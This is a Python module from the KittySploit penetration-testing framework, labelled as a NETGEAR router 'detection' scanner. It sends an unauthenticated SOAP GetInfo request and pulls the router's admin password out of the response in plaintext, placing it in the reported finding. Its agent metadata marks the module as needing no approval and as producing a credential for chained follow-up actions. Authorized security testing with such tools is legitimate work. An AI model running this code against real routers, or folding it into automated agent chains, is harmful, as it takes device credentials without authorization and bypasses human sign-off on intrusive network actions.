#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NETGEAR SOAP LANConfigSecurity password disclosure."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NETGEAR - SOAP Password Disclosure Detection',
        'description': (
            'Detects NETGEAR router unauthenticated SOAP GetInfo disclosure that returns '
            'admin NewPassword via LANConfigSecurity.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'netgear', 'router', 'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/36124',
        ],
    }

    def run(self):
        r = self.http_request(
            method='POST',
            path='/',
            data='=',
            headers={
                'Soapaction': 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if 'GetInfoResponse' not in body or 'NewPassword' not in body:
            return False
        m = re.search(r'<NewPassword>([^<]+)</NewPassword>', body)
        if m:
            self.set_info(
                severity='critical',
                reason=f'NETGEAR SOAP password disclosure ({m.group(1)})',
                path='/',
            )
            return True
        return False
